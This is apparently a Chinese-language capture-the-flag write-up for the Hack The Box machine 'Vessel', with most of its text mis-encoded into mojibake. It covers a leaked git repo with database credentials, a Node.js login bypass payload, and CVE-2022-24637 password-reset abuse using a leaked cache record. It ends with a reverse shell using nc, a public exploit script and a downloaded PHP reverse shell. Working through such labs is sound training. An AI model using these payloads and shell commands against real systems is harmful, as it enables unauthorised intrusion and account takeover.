â””â”€â”€ exclude â”‚&nbsp;&nbsp; â”œâ”€â”€ logs â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ HEAD â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ refs â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ heads â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ master â”‚&nbsp;&nbsp; â”œâ”€â”€ objects â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ 00 â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ 459be15fd7f38a86843ba1ce5cd6eabeb50a59 â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ 0a â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ ddd8d9ac7f6daf0d44ee78925d07de0a3dee44 â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ ...... â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ ...... â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ fc â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ 5ce922a9d1073d6c9cc34770c140cc3488f3fa â”‚&nbsp;&nbsp; â”œâ”€â”€ ORIG_HEAD â”‚&nbsp;&nbsp; â””â”€â”€ refs â”‚&nbsp;&nbsp; â””â”€â”€ heads â”‚&nbsp;&nbsp; â””â”€â”€ master â”œâ”€â”€ index.js â”œâ”€â”€ public â”‚&nbsp;&nbsp; â”œâ”€â”€ css â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ style.css â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ styles.css â”‚&nbsp;&nbsp; â”œâ”€â”€ img â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ bg-masthead.jpg â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ error-404-monochrome.svg â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ favicon.ico â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ portfolio â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ thumbnails â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ 1.jpg â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ 2.jpg â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ 3.jpg â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ 4.jpg â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ 5.jpg â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”œâ”€â”€ 6.jpg â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ images.zip â”‚&nbsp;&nbsp; â”‚&nbsp;&nbsp; â””â”€â”€ profile.jpg â”‚&nbsp;&nbsp; â””â”€â”€ js â”‚&nbsp;&nbsp; â”œâ”€â”€ script.js â”‚&nbsp;&nbsp; â””â”€â”€ scripts.js â”œâ”€â”€ routes â”‚&nbsp;&nbsp; â””â”€â”€ index.js â””â”€â”€ views â”œâ”€â”€ 401.ejs â”œâ”€â”€ 404.ejs â”œâ”€â”€ 500.ejs â”œâ”€â”€ index.ejs â”œâ”€â”€ login.ejs â”œâ”€â”€ register.ejs â””â”€â”€ reset.ejs åœ¨./Vessel/git/config/db.js çœ‹åˆ°æ•°æ®åº“è¿æ¥ä¿¡æ¯ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# cat ./Vessel/git/config/db.js var mysql = require('mysql'); var connection = { db: { host : 'localhost', user : 'default', password : 'daqvACHKvRn84VdVp', database : 'vessel' }}; module.exports = connection; åœ¨./Vessel/git/routes/index.jsçœ‹åˆ°ç™»å½•é¡µé¢çš„æ•°æ®åº“æŸ¥è¯¢è¯­å¥ cat ./Vessel/git/routes/index.js router.post('/api/login', function(req, res) { let username = req.body.username; let password = req.body.password; if (username &amp;&amp; password) { connection.query('SELECT * FROM accounts WHERE username = ? AND password = ?', [username, password], function(error, results, fields) { if (error) throw error; if (results.length &gt; 0) { req.session.loggedin = true; req.session.username = username; req.flash('success', 'Succesfully logged in!'); res.redirect('/admin'); } else { req.flash('error', 'Wrong credentials! Try Again!'); res.redirect('/login'); } res.end(); }); } else { res.redirect('/login'); } }); æ­¤å¤„çš„SQLæŸ¥è¯¢è¯­å¥å‚æ•°åšäº†å ä½ç¬¦å¤„ç†ï¼Œç›¸å½“äºæ˜¯é¢„ç¼–è¯‘ ç›´æ¥æŠŠè¿™æ¡è¯­å¥å¤åˆ¶åˆ°googleæœç´¢ï¼Œæ‰¾åˆ°å¦‚ä¸‹æ–‡ç« ï¼Œæ˜¯Nodejsçš„SQLæ³¨å…¥ å››ã€Nodejs-SQLæ³¨å…¥å‚è€ƒï¼šhttps://www.stackhawk.com/blog/node-js-sql-injection-guide-examples-and-prevention/ æ„æ€å¤§æ¦‚æ˜¯è¯´ï¼Œå½“æ„é€ ä¼ å‚payloadä¸ºusername=admin&amp;password[password]=1æ—¶ï¼Œç”±äºNodejsæœ¬èº«çš„ç‰¹æ€§ï¼Œä¼šå°†password[password]=1è§£ææˆä¸€ä¸ªå¯¹è±¡ï¼Œè€Œä¸æ˜¯è§£ææˆå­—ç¬¦ä¸²ï¼Œä»è€ŒsqlæŸ¥è¯¢è¯­å¥ä¼šå˜æˆå¦‚ä¸‹ SELECT * FROM accounts WHERE username = 'admin' AND password = `password` = 1 ä»è€Œä½¿usernameä¸ºadminï¼Œè€Œpasswordé€»è¾‘åˆ¤æ–­æ’ä¸º1ï¼ˆå¸ƒå°”trueï¼‰ï¼Œä»¥æ­¤è¾¾åˆ°ç±»ä¼¼ä¸‡èƒ½å¯†ç çš„æ•ˆæœã€‚ å¼€å§‹æ“ä½œ ç‚¹å‡»ä¸»é¡µé¢å³ä¸Šè§’Loginè¿›å…¥ç™»å½•é¡µé¢ï¼Œéšä¾¿è¾“å…¥ç”¨æˆ·åå¯†ç ï¼ŒåŒæ—¶BurpæŠ“åŒ… ä¿®æ”¹è¯·æ±‚åŒ…æ•°æ®éƒ¨åˆ†ä¸ºusername=admin&amp;password[password]=1 è¿ç»­ç‚¹å‡»ä¸¤æ¬¡Forwardï¼Œå›åˆ°æµè§ˆå™¨ï¼Œå¯çœ‹åˆ°ä»¥adminèº«ä»½ç™»å½•æˆåŠŸ æŸ¥çœ‹é¡µé¢æºä»£ç ï¼Œå‘ç°å¦‚ä¸‹å­åŸŸå å°†å­åŸŸåå†™å…¥æœ¬åœ°hostsæ–‡ä»¶ echo \"10.10.11.178 openwebanalytics.vessel.htb\" &gt;&gt; /etc/hosts æµè§ˆå™¨æ‰“å¼€openwebanalytics.vessel.htb ç™»å½•æ¡†ä¸Šä¸‹éƒ½å†™ç€Open Web Analyticsï¼Œé‚£å°±å»googleä¸€ä¸‹Open Web Analytics exploitï¼Œçœ‹åˆ°äº†è¿™ç¯‡æ–‡ç«  From Single/Double Quote Confusion To RCE(CVE-2022-24637)ï¼šhttps://devel0pment.de/?p=2494 äº”ã€CVE-2022-24637 å¦‚å›¾ï¼Œæ–‡ç« å¼€å¤´ä»‹ç»äº†è¿™ä¸ªCVEçš„ä¸¤ä¸ªæ¼æ´ç‚¹ï¼š å®šä¹‰PHPç¼“å­˜æ–‡ä»¶å¤´çš„åœ°æ–¹ï¼Œå¦‚æœç”¨'&lt;?php\\n...'ï¼Œè€Œä¸æ˜¯\"&lt;?php\\n...\"ï¼Œä¼šå¯¼è‡´\\nä¸ä¼šè¢«è§£ææˆæ¢è¡Œç¬¦ï¼Œé‚£ä¹ˆ&lt;?php\\nå°±ä¸æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„PHPæ–‡ä»¶å¤´ï¼Œæ‰€åœ¨çš„ç¼“å­˜æ–‡ä»¶å°±ä¸ä¼šè¢«è§£ææˆPHPä»£ç ï¼Œåªä¼šè¢«è§£ææˆæ™®é€šæ–‡æœ¬ï¼Œä»è€Œå¯¼è‡´ç¼“å­˜ä¿¡æ¯æ³„éœ²ã€‚æ³„éœ²çš„ä¿¡æ¯è¿˜å¯è¢«ç”¨äºé‡ç½®ç®¡ç†å‘˜å¯†ç ã€‚ PHPæ–‡ä»¶å†™å…¥ï¼Œä½†éœ€è¦ç®¡ç†å‘˜æƒé™ã€‚é€šè¿‡æ„é€ POSTè¯·æ±‚æ›´æ”¹æ—¥å¿—è·¯å¾„å’Œæ—¥å¿—ç­‰çº§ï¼Œå°†æ—¥å¿—æ–‡ä»¶è®¾ç½®ä¸ºPHPæ–‡ä»¶ã€‚é€šè¿‡åŒæ—¶æé«˜æ—¥å¿—çº§åˆ«å¹¶ä½¿ç”¨æ”»å‡»è€…æ§åˆ¶çš„æ•°æ®ç”Ÿæˆäº‹ä»¶ï¼Œå¯ä»¥å°† PHP ä»£ç æ³¨å…¥åˆ°è¯¥æ—¥å¿—æ–‡ä»¶ä¸­ã€‚è¿™å¯¼è‡´å¯ä»¥æ‰§è¡Œä»»æ„PHPä»£ç ã€‚ è‡ªå·±æœ¬åœ°ç”¨php -aæµ‹è¯•ä¸€ä¸‹ php &gt; echo '&lt;?php\\n/*wa0er*/\\n?&gt;'; &lt;?php\\n/*wa0er*/\\n?&gt; php &gt; echo \"&lt;?php\\n/*wa0er*/\\n?&gt;\"; &lt;?php /*wa0er*/ ?&gt; å¦‚ä¸Šç»“æœå¯ä»¥çœ‹å‡ºå•åŒå¼•å·è§£æçš„å·®å¼‚ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# cat test1.php &lt;?php\\necho 9898;\\n?&gt; â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# php -f test1.php &lt;?php\\necho 9898;\\n?&gt; â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# cat test2.php &lt;?php echo 9898; ?&gt; â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# php -f test2.php 9898 å¦‚ä¸Šç»“æœå¯ä»¥çœ‹å‡ºä¸¤ç§æ ¼å¼åœ¨æ–‡ä»¶ä¸­è§£ææ•ˆæœ æ¼æ´æ‰€åœ¨æºç ï¼š https://github.com/Open-Web-Analytics/Open-Web-Analytics/blob/1.7.3/modules/base/classes/fileCache.php å…³é”®ä»£ç å¦‚ä¸‹ ... class owa_fileCache extends owa_cache { ... var $cache_file_header = '&lt;?php\\n/*'; var $cache_file_footer = '*/\\n?&gt;'; ... function putItemToCacheStore($collection, $id) { ... $data = $this-&gt;cache_file_header.base64_encode(serialize($this-&gt;cache[$collection][$id])).$this-&gt;cache_file_footer; ... $tcf_handle = @fopen($temp_cache_file, 'w'); ... fputs($tcf_handle, $data); ... æ­¤å¤„ç”¨çš„å°±æ˜¯å•å¼•å·ï¼Œå¾—åˆ°çš„ç¼“å­˜æ–‡ä»¶ä¸­çš„ç¼“å­˜æ•°æ®æ ¼å¼å¦‚ä¸‹ &lt;?php\\n/*å…ˆåºåˆ—åŒ–ç„¶åbase64ç¼–ç çš„æ•°æ®*/\\n?&gt; ç¼“å­˜æ–‡ä»¶åå‘½åå¦‚ä¸‹ ... $cache_file = $collection_dir.$id.'.php'; ... if (!@ rename($temp_cache_file, $cache_file)) { ... å®¡è®¡å‘ç°ï¼Œé»˜è®¤idå€¼ä¸º1ï¼Œç¼“å­˜æ–‡ä»¶æ‹¼æ¥åçš„è®¿é—®è·¯å¾„ä¸ºï¼ˆå®¡è®¡ç€é‡å…³æ³¨fileCache.phpã€cache.phpã€owa_coreAPI.phpã€owa_entity.phpã€user.phpï¼‰ http://localhost/owa_web/owa-data/caches/1/owa_user/xxx.php â€œhttp://localhost/owa_web/â€è¡¨ç¤ºowaä¸»é¡µé¢æ‰€åœ¨è·¯å¾„ï¼Œæ­¤å¤„ä¸ºhttp://openwebanalytics.vessel.htb/ phpæ–‡ä»¶åâ€œxxxâ€è¡¨ç¤ºâ€œid+idå€¼â€çš„32ä½md5å€¼ï¼Œæ¯”å¦‚id=1ï¼Œé‚£ä¹ˆxxxä¸ºâ€œid1â€çš„md5å€¼ åœ¨openwebanalytics.vessel.htbç‚¹å‡»å¿˜è®°å¯†ç ï¼Œè¿›å…¥é‡ç½®å¯†ç é¡µé¢ï¼Œåˆšæ‰åœ¨gitæ—¥å¿—çœ‹åˆ°é‚®ç®±æ ¼å¼ï¼Œå°è¯•ethan@vessel.htbä¸å­˜åœ¨ï¼Œå°è¯•admin@vessel.htb æç¤ºå‘é€é‚®ä»¶åˆ°admin@vessel.htb ç„¶åæ ¹æ®åˆšæ‰çš„åˆ†æï¼Œid1çš„md5å€¼å¦‚å›¾ ç¼“å­˜æ–‡ä»¶çš„è®¿é—®è·¯å¾„å¦‚ä¸‹ http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/fafe1b60c24107ccd8f4562213e44849.php æµè§ˆå™¨è®¿é—®ç¼“å­˜æ–‡ä»¶ï¼Œé¡µé¢ç©ºç™½ï¼ŒæŸ¥çœ‹é¡µé¢æºä»£ç ï¼Œè·å–åˆ°æ³„éœ²çš„base64æ•°æ® &lt;?php\\n/*Tzo4OiJvd2FfdXNlciI6NTp7czo0OiJuYW1lIjtzOjk6ImJhc2UudXNlciI7czoxMDoicHJvcGVydGllcyI7YToxMDp7czoyOiJpZCI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MToiMSI7czo5OiJkYXRhX3R5cGUiO3M6NjoiU0VSSUFMIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjc6InVzZXJfaWQiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjU6ImFkbWluIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjoxO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjg6InBhc3N3b3JkIjtPOjEyOiJvd2FfZGJDb2x1bW4iOjExOntzOjQ6Im5hbWUiO047czo1OiJ2YWx1ZSI7czo2MDoiJDJ5JDEwJDk1MUhISkY0b0RqWmR6MGJTSWcxYnV1R2ZEYUwxVHpvcGt6d2U2SmRBZnZjU0hoLzd3WHNTIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjQ6InJvbGUiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjU6ImFkbWluIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjk6InJlYWxfbmFtZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTM6ImRlZmF1bHQgYWRtaW4iO3M6OToiZGF0YV90eXBlIjtzOjEyOiJWQVJDSEFSKDI1NSkiO3M6MTE6ImZvcmVpZ25fa2V5IjtOO3M6MTQ6ImlzX3ByaW1hcnlfa2V5IjtiOjA7czoxNDoiYXV0b19pbmNyZW1lbnQiO2I6MDtzOjk6ImlzX3VuaXF1ZSI7YjowO3M6MTE6ImlzX25vdF9udWxsIjtiOjA7czo1OiJsYWJlbCI7TjtzOjU6ImluZGV4IjtOO3M6MTM6ImRlZmF1bHRfdmFsdWUiO047fXM6MTM6ImVtYWlsX2FkZHJlc3MiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjE2OiJhZG1pbkB2ZXNzZWwuaHRiIjtzOjk6ImRhdGFfdHlwZSI7czoxMjoiVkFSQ0hBUigyNTUpIjtzOjExOiJmb3JlaWduX2tleSI7TjtzOjE0OiJpc19wcmltYXJ5X2tleSI7YjowO3M6MTQ6ImF1dG9faW5jcmVtZW50IjtiOjA7czo5OiJpc191bmlxdWUiO2I6MDtzOjExOiJpc19ub3RfbnVsbCI7YjowO3M6NToibGFiZWwiO047czo1OiJpbmRleCI7TjtzOjEzOiJkZWZhdWx0X3ZhbHVlIjtOO31zOjEyOiJ0ZW1wX3Bhc3NrZXkiO086MTI6Im93YV9kYkNvbHVtbiI6MTE6e3M6NDoibmFtZSI7TjtzOjU6InZhbHVlIjtzOjMyOiJjNjNmZWQzOGU1OWIyNmU2OGY1YjJjZDc4ZWJkNmJlNSI7czo5OiJkYXRhX3R5cGUiO3M6MTI6IlZBUkNIQVIoMjU1KSI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czoxMzoiY3JlYXRpb25fZGF0ZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTA6IjE2NTAyMTE2NTkiO3M6OToiZGF0YV90eXBlIjtzOjY6IkJJR0lOVCI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czoxNjoibGFzdF91cGRhdGVfZGF0ZSI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MTA6IjE2NTAyMTE2NTkiO3M6OToiZGF0YV90eXBlIjtzOjY6IkJJR0lOVCI7czoxMToiZm9yZWlnbl9rZXkiO047czoxNDoiaXNfcHJpbWFyeV9rZXkiO2I6MDtzOjE0OiJhdXRvX2luY3JlbWVudCI7YjowO3M6OToiaXNfdW5pcXVlIjtiOjA7czoxMToiaXNfbm90X251bGwiO2I6MDtzOjU6ImxhYmVsIjtOO3M6NToiaW5kZXgiO047czoxMzoiZGVmYXVsdF92YWx1ZSI7Tjt9czo3OiJhcGlfa2V5IjtPOjEyOiJvd2FfZGJDb2x1bW4iOjExOntzOjQ6Im5hbWUiO3M6NzoiYXBpX2tleSI7czo1OiJ2YWx1ZSI7czozMjoiYTM5MGNjMDI0N2VjYWRhOWEyYjhkMjMzOGI5Y2E2ZDIiO3M6OToiZGF0YV90eXBlIjtzOjEyOiJWQVJDSEFSKDI1NSkiO3M6MTE6ImZvcmVpZ25fa2V5IjtOO3M6MTQ6ImlzX3ByaW1hcnlfa2V5IjtiOjA7czoxNDoiYXV0b19pbmNyZW1lbnQiO2I6MDtzOjk6ImlzX3VuaXF1ZSI7YjowO3M6MTE6ImlzX25vdF9udWxsIjtiOjA7czo1OiJsYWJlbCI7TjtzOjU6ImluZGV4IjtOO3M6MTM6ImRlZmF1bHRfdmFsdWUiO047fX1zOjE2OiJfdGFibGVQcm9wZXJ0aWVzIjthOjQ6e3M6NToiYWxpYXMiO3M6NDoidXNlciI7czo0OiJuYW1lIjtzOjg6Im93YV91c2VyIjtzOjk6ImNhY2hlYWJsZSI7YjoxO3M6MjM6ImNhY2hlX2V4cGlyYXRpb25fcGVyaW9kIjtpOjYwNDgwMDt9czoxMjoid2FzUGVyc2lzdGVkIjtiOjE7czo1OiJjYWNoZSI7Tjt9*/\\n?&gt; Base64è§£ç å¾—åºåˆ—åŒ–æ•°æ® O:8:\"owa_user\":5:{s:4:\"name\";s:9:\"base.user\";s:10:\"properties\";a:10:{s:2:\"id\";O:12:\"owa_dbColumn\":11:{s:4:\"name\";N;s:5:\"value\";s:1:\"1\";s:9:\"data_type\";s:6:\"SERIAL\";s:11:\"foreign_key\";N;s:14:\"is_primary_key\";b:0;s:14:\"auto_increment\";b:0;s:9:\"is_unique\";b:0;s:11:\"is_not_null\";b:0;s:5:\"label\";N;s:5:\"index\";N;s:13:\"default_value\";N;}s:7:\"user_id\";O:12:\"owa_dbColumn\":11:{s:4:\"name\";N;s:5:\"value\";s:5:\"admin\";s:9:\"data_type\";s:12:\"VARCHAR(255)\";s:11:\"foreign_key\";N;s:14:\"is_primary_key\";b:1;s:14:\"auto_increment\";b:0;s:9:\"is_unique\";b:0;s:11:\"is_not_null\";b:0;s:5:\"label\";N;s:5:\"index\";N;s:13:\"default_value\";N;}s:8:\"password\";O:12:\"owa_dbColumn\":11:{s:4:\"name\";N;s:5:\"value\";s:60:\"$2y$10$951HHJF4oDjZdz0bSIg1buuGfDaL1Tzopkzwe6JdAfvcSHh/7wXsS\";s:9:\"data_type\";s:12:\"VARCHAR(255)\";s:11:\"foreign_key\";N;s:14:\"is_primary_key\";b:0;s:14:\"auto_increment\";b:0;s:9:\"is_unique\";b:0;s:11:\"is_not_null\";b:0;s:5:\"label\";N;s:5:\"index\";N;s:13:\"default_value\";N;}s:4:\"role\";O:12:\"owa_dbColumn\":11:{s:4:\"name\";N;s:5:\"value\";s:5:\"admin\";s:9:\"data_type\";s:12:\"VARCHAR(255)\";s:11:\"foreign_key\";N;s:14:\"is_primary_key\";b:0;s:14:\"auto_increment\";b:0;s:9:\"is_unique\";b:0;s:11:\"is_not_null\";b:0;s:5:\"label\";N;s:5:\"index\";N;s:13:\"default_value\";N;}s:9:\"real_name\";O:12:\"owa_dbColumn\":11:{s:4:\"name\";N;s:5:\"value\";s:13:\"default admin\";s:9:\"data_type\";s:12:\"VARCHAR(255)\";s:11:\"foreign_key\";N;s:14:\"is_primary_key\";b:0;s:14:\"auto_increment\";b:0;s:9:\"is_unique\";b:0;s:11:\"is_not_null\";b:0;s:5:\"label\";N;s:5:\"index\";N;s:13:\"default_value\";N;}s:13:\"email_address\";O:12:\"owa_dbColumn\":11:{s:4:\"name\";N;s:5:\"value\";s:16:\"admin@vessel.htb\";s:9:\"data_type\";s:12:\"VARCHAR(255)\";s:11:\"foreign_key\";N;s:14:\"is_primary_key\";b:0;s:14:\"auto_increment\";b:0;s:9:\"is_unique\";b:0;s:11:\"is_not_null\";b:0;s:5:\"label\";N;s:5:\"index\";N;s:13:\"default_value\";N;}s:12:\"temp_passkey\";O:12:\"owa_dbColumn\":11:{s:4:\"name\";N;s:5:\"value\";s:32:\"c63fed38e59b26e68f5b2cd78ebd6be5\";s:9:\"data_type\";s:12:\"VARCHAR(255)\";s:11:\"foreign_key\";N;s:14:\"is_primary_key\";b:0;s:14:\"auto_increment\";b:0;s:9:\"is_unique\";b:0;s:11:\"is_not_null\";b:0;s:5:\"label\";N;s:5:\"index\";N;s:13:\"default_value\";N;}s:13:\"creation_date\";O:12:\"owa_dbColumn\":11:{s:4:\"name\";N;s:5:\"value\";s:10:\"1650211659\";s:9:\"data_type\";s:6:\"BIGINT\";s:11:\"foreign_key\";N;s:14:\"is_primary_key\";b:0;s:14:\"auto_increment\";b:0;s:9:\"is_unique\";b:0;s:11:\"is_not_null\";b:0;s:5:\"label\";N;s:5:\"index\";N;s:13:\"default_value\";N;}s:16:\"last_update_date\";O:12:\"owa_dbColumn\":11:{s:4:\"name\";N;s:5:\"value\";s:10:\"1650211659\";s:9:\"data_type\";s:6:\"BIGINT\";s:11:\"foreign_key\";N;s:14:\"is_primary_key\";b:0;s:14:\"auto_increment\";b:0;s:9:\"is_unique\";b:0;s:11:\"is_not_null\";b:0;s:5:\"label\";N;s:5:\"index\";N;s:13:\"default_value\";N;}s:7:\"api_key\";O:12:\"owa_dbColumn\":11:{s:4:\"name\";s:7:\"api_key\";s:5:\"value\";s:32:\"a390cc0247ecada9a2b8d2338b9ca6d2\";s:9:\"data_type\";s:12:\"VARCHAR(255)\";s:11:\"foreign_key\";N;s:14:\"is_primary_key\";b:0;s:14:\"auto_increment\";b:0;s:9:\"is_unique\";b:0;s:11:\"is_not_null\";b:0;s:5:\"label\";N;s:5:\"index\";N;s:13:\"default_value\";N;}}s:16:\"_tableProperties\";a:4:{s:5:\"alias\";s:4:\"user\";s:4:\"name\";s:8:\"owa_user\";s:9:\"cacheable\";b:1;s:23:\"cache_expiration_period\";i:604800;}s:12:\"wasPersisted\";b:1;s:5:\"cache\";N;} å…³é”®ç‚¹åœ¨äºtemp_passkeyçš„å€¼c63fed38e59b26e68f5b2cd78ebd6be5å¯ç”¨æ¥é‡ç½®adminçš„å¯†ç  é‚£ä¹ˆæˆ‘ä»¬æŠŠURLæœ«å°¾owa_doçš„å€¼æ”¹ä¸ºbase.usersChangePasswordï¼Œè®¿é—® http://openwebanalytics.vessel.htb/index.php?owa_do=base.usersChangePassword ç›´æ¥ä¿®æ”¹å¯†ç ï¼Œç„¶åç‚¹å‡»Save Your New Passwordï¼Œä¼šæç¤ºError! Can't find your temporary passkey in the db. ä¸€èˆ¬æ€è·¯åº”è¯¥æ˜¯æœ‰ä¸ªåå­—ç±»ä¼¼temp_passkeyçš„å‚æ•°ï¼Œå¯ä»¥ä¿®æ”¹ä¸ºæˆ‘ä»¬åˆšæ‰è·å¾—çš„temp_passkeyå€¼ï¼Œä»¥æ­¤æ¥ç»•è¿‡ä¿®æ”¹å¯†ç æ—¶æ‰€éœ€çš„è®¤è¯æ­¥éª¤ã€‚ ç„¶åæˆ‘ä»¬å°±åœ¨F12é¡µé¢æºç çœ‹åˆ°äº†å¦‚ä¸‹å›¾å†…å®¹ æˆ‘ä»¬æŠŠhiddenåˆ é™¤ï¼Œå¯çœ‹åˆ°æ˜¾ç¤ºé™¤äº†å¦‚ä¸‹æ–‡æœ¬æ¡† è¾“å…¥æ–°å¯†ç ï¼Œç„¶åè¾“å…¥åˆšæ‰temp_passkeyçš„å€¼ï¼Œç‚¹å‡»Save Your New Passwordï¼ŒæˆåŠŸä¿®æ”¹ï¼ˆè¿™é‡Œè¯•äº†å¥½å‡ æ¬¡ï¼Œå¯èƒ½temp_passkeyåˆ·æ–°æ¯”è¾ƒå¿«ï¼‰ ç”¨adminç”¨æˆ·å’Œåˆšä¿®æ”¹çš„å¯†ç ç™»å½•ï¼Œç™»å½•æˆåŠŸ å·²æ˜¯adminç”¨æˆ·ï¼Œé‚£å°±å°è¯•ç”¨ä¸Šé¢æ–‡ç« æ¼æ´åˆ©ç”¨çš„ç¬¬äºŒé˜¶æ®µï¼Œè¿›ä¸€æ­¥æ‰§è¡Œå‘½ä»¤åå¼¹shellï¼Œä¸‹è½½ä¸‹é¢çš„exploitè„šæœ¬åˆ°æœ¬åœ° git clone https://github.com/hupe1980/CVE-2022-24637 å…ˆå¼€å¯ncç›‘å¬ nc -lvnp 9898 ç”¨å¦‚ä¸‹å‘½ä»¤æ‰§è¡Œè„šæœ¬ python3 exploit.py -u admin -p wa0er http://openwebanalytics.vessel.htb/ 10.10.16.7 9898 å¦‚å›¾æˆåŠŸè·å–www-dataç”¨æˆ·shellï¼Œä½†è¿™ä¸ªshellç¯å¢ƒä¸ç¨³å®šï¼Œæ¢ä¸€ä¸ªäº¤äº’shell ä¸‹è½½å¦‚ä¸‹è„šæœ¬åˆ°æœ¬åœ° wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz ä¿®æ”¹ipå’Œportä¸ºæœ¬åœ°ipå’Œç«¯å£ æœ¬åœ°å¼€å¯httpæœåŠ¡ python3 -m http.server 80 